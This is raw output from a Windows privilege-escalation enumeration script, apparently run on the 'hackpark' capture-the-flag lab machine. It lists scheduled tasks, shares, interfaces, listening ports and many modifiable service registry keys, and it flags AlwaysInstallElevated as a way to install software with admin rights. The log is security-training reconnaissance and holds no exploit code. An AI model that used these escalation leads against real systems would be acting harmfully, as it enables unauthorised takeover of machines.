Folder: \Microsoft\Windows\Time Synchronization                                                                  
SynchronizeTime                          N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Time Zone                                                                             
SynchronizeTimeZone                      N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\TPM                                                                                   
Tpm-Maintenance                          N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\UPnP                                                                                  
UPnPHostConfig                           N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\User Profile Service                                                                  
                                                                                                                 
Folder: \Microsoft\Windows\WDI                                                                                   
ResolutionHost                           N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Windows Error Reporting                                                               
QueueReporting                           N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Windows Filtering Platform                                                            
BfeOnServiceStartTypeChange              N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\WindowsColorSystem                                                                    
                                                                                                                 
Folder: \Microsoft\Windows\WindowsUpdate                                                                         
Scheduled Start                          N/A                    Ready                                            
                                                                                                                 
Folder: \Microsoft\Windows\Wininet                                                                               
CacheTask                                N/A                    Running                                          
                                                                                                                 
Folder: \Microsoft\Windows\Workplace Join                                                                        
                                                                                                                 
Folder: \Microsoft\Windows\WS                                                                                    
WSTask                                   N/A                    Ready                                            
                                                                                                                 
 [+] AlwaysInstallElevated?                                                                                      
   [i] If '1' then you can install a .msi file with admin privileges ;)                                          
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated    
                                                                                                                 
[*] NETWORK                                                                                                      
 [+] CURRENT SHARES                                                                                              
                                                                                                                 
Share name   Resource                        Remark                                                              
                                                                                                                 
-------------------------------------------------------------------------------                                  
C$           C:\                             Default share                                                       
IPC$                                         Remote IPC                                                          
ADMIN$       C:\Windows                      Remote Admin                                                        
The command completed successfully.                                                                              
                                                                                                                 
                                                                                                                 
 [+] INTERFACES                                                                                                  
                                                                                                                 
Windows IP Configuration                                                                                         
                                                                                                                 
   Host Name . . . . . . . . . . . . : hackpark                                                                  
   Primary Dns Suffix  . . . . . . . :                                                                           
   Node Type . . . . . . . . . . . . : Hybrid                                                                    
   IP Routing Enabled. . . . . . . . : No                                                                        
   WINS Proxy Enabled. . . . . . . . : No                                                                        
   DNS Suffix Search List. . . . . . : eu-west-1.ec2-utilities.amazonaws.com                                     
                                       eu-west-1.compute.internal                                                
                                                                                                                 
Ethernet adapter Ethernet 2:                                                                                     
                                                                                                                 
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal                                                
   Description . . . . . . . . . . . : AWS PV Network Device #0                                                  
   Physical Address. . . . . . . . . : 02-BE-3B-95-69-49                                                         
   DHCP Enabled. . . . . . . . . . . : Yes                                                                       
   Autoconfiguration Enabled . . . . : Yes                                                                       
   Link-local IPv6 Address . . . . . : fe80::b45b:96ae:4248:215%14(Preferred)                                    
   IPv4 Address. . . . . . . . . . . : 10.10.97.210(Preferred)                                                   
   Subnet Mask . . . . . . . . . . . : 255.255.0.0                                                               
   Lease Obtained. . . . . . . . . . : Tuesday, September 27, 2022 9:48:40 AM                                    
   Lease Expires . . . . . . . . . . : Tuesday, September 27, 2022 12:48:39 PM                                   
   Default Gateway . . . . . . . . . : 10.10.0.1                                                                 
   DHCP Server . . . . . . . . . . . : 10.10.0.1                                                                 
   DHCPv6 IAID . . . . . . . . . . . : 335943906                                                                 
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-DA-49-4B-08-00-27-7A-66-52                                 
   DNS Servers . . . . . . . . . . . : 10.0.0.2                                                                  
   NetBIOS over Tcpip. . . . . . . . : Enabled                                                                   
                                                                                                                 
Tunnel adapter isatap.eu-west-1.compute.internal:                                                                
                                                                                                                 
   Media State . . . . . . . . . . . : Media disconnected                                                        
   Connection-specific DNS Suffix  . : eu-west-1.compute.internal                                                
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter                                                  
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0                                                   
   DHCP Enabled. . . . . . . . . . . : No                                                                        
   Autoconfiguration Enabled . . . . : Yes                                                                       
                                                                                                                 
 [+] USED PORTS                                                                                                  
   [i] Check for services restricted from the outside                                                            
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4                                         
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       784                                       
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4                                         
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       1296                                      
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4                                         
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4                                         
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       588                                       
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       872                                       
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       900                                       
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1136                                      
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING       684                                       
  TCP    0.0.0.0:49166          0.0.0.0:0              LISTENING       676                                       
  TCP    10.10.97.210:139       0.0.0.0:0              LISTENING       4                                         
  TCP    [::]:80                [::]:0                 LISTENING       4                                         
  TCP    [::]:135               [::]:0                 LISTENING       784                                       
  TCP    [::]:445               [::]:0                 LISTENING       4                                         
  TCP    [::]:3389              [::]:0                 LISTENING       1296                                      
  TCP    [::]:5985              [::]:0                 LISTENING       4                                         
  TCP    [::]:47001             [::]:0                 LISTENING       4                                         
  TCP    [::]:49152             [::]:0                 LISTENING       588                                       
  TCP    [::]:49153             [::]:0                 LISTENING       872                                       
  TCP    [::]:49154             [::]:0                 LISTENING       900                                       
  TCP    [::]:49155             [::]:0                 LISTENING       1136                                      
  TCP    [::]:49157             [::]:0                 LISTENING       684                                       
  TCP    [::]:49166             [::]:0                 LISTENING       676                                       
                                                                                                                 
 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY                                                                
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\.NETFramework                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\1394ohci                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\3ware                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ACPI                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpiex                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpipagr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AcpiPmi                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\acpitime                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ADP80XX                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\adsi                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AeLookupSvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AFD                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\agp440                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ahcache                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ALG                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmazonSSMAgent                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdK8                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AmdPPM                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsata                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdsbs                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\amdxata                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppHostSvc                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppID                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppIDSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Appinfo                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppMgmt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppReadiness                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AppXSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\arcsas                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ASP.NET_4.0.30319                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\aspnet_state                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AsyncMac                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\atapi                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AudioEndpointBuilder                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Audiosrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSLiteAgent                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\AWSNVMe                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\b06bdrv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicDisplay                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BasicRender                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BattC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Beep                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadfcoei                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bfadi                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BFE                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BITS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bowser                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\BrokerInfrastructure                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Browser                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxfcoe                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\bxois                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cdrom                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CertPropSvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\cht4vbd                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CLFS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_32               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\clr_optimization_v4.0.30319_64               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CmBatt                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CNG                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CngHwAssist                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CompositeBus                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\COMSysApp                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\condrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\crypt32                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\CryptSvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DCLocator                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\defragsvc                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceAssociationService                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DeviceInstall                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dfsc                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dhcp                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\disk                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dmvsc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Dnscache                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\dot3svc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\drmkaud                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DsmSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\DXGKrnl                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\E1G60                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Eaphost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ebdrv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ec2Config                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EFS                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxfcoe                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\elxstor                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ErrDev                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ESENT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventLog                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\EventSystem                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\exfat                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fastfat                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fcvsc                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdc                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\fdPHost                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FDResPub                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FileInfo                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Filetrace                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\flpydisk                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FltMgr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FontCache                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FsDepends                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Fs_Rec                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\FxPPM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gagp30kx                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\gencounter                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\GPIOClx0101                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HdAudAddService                              
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HDAudBus                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidBatt                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hidserv                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HidUsb                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hkmsvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HpSAMD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HTTP                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hwpolicy                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\hyperkbd                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\HyperVideo                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\i8042prt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorAV                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iaStorV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ibbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IEEtwCollectorService                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IKEEXT                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\inetaccs                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\InetInfo                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelide                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\intelppm                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IpFilterDriver                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iphlpsvc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPMIDRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\IPNAT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\isapnp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\iScsiPrt                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdclass                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kbdhid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\kdnic                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KeyIso                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KPSSVC                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecDD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KSecPkg                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ksthunk                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\KtmRm                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanServer                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LanmanWorkstation                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ldap                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdio                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lltdsvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\lmhosts                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Lsa                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS2                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SAS3                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSI_SSS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\LSM                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\luafv                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasas                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\megasr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mlx4_bus                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MMCSS                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Modem                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\monitor                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouclass                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mouhid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mountmgr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mpsdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MpsSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb10                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mrxsmb20                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsBridge                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSDTC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Msfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidkmdf                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mshidumdf                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msisadrv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSiSCSI                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\msiserver                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSKSSRV                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsLbfoProvider                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPCLOCK                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSPQM                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MsRPC                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mssmbios                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MSTEE                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\MTConfig                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Mup                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\mvumis                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\napagent                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NcaSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ndfltr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDIS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisCap                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisImPlatform                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisTapi                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ndisuio                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisVirtualBus                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NdisWan                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDISWANLEGACY                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NDProxy                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBIOS                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetBT                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netlogon                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Netman                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netprofm                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NetTcpPortSharing                            
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\netvsc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NlaSvc                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Npfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\npsvctrig                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsi                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nsiproxy                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\NTDS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Ntfs                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Null                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvraid                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nvstor                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\nv_agp                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Parport                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\partmgr                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pci                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pciide                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcmcia                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pcw                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pdc                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PEAUTH                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfDisk                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfHost                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfNet                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfOS                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PerfProc                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\pla                                          
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PlugPlay                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PolicyAgent                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PortProxy                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Power                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PptpMiniport                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PrintNotify                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Processor                                    
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ProfSvc                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Psched                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\PsShutdownSvc                                
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql2300i                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ql40xx2i                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\qlfcoei                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAcd                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAgileVpn                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasAuto                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Rasl2tp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasMan                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasPppoe                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RasSstp                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdbss                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDMANDK                                      
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rdpbus                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPDR                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPNP                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RDPUDD                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RdpVideoMiniport                             
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ReFS                                         
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteAccess                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RemoteRegistry                               
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcEptMapper                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RpcLocator                                   
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\RSoPProv                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\rspndr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\s3cap                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sacsvr                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sbp2port                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCardSvr                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\ScDeviceEnum                                 
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\scfilter                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\Schedule                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SCPolicySvc                                  
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdbus                                        
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\sdstor                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\secdrv                                       
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\seclogon                                     
You can modify HKEY_LOCAL_MACHINE\system\currentcontrolset\services\SENS                                         
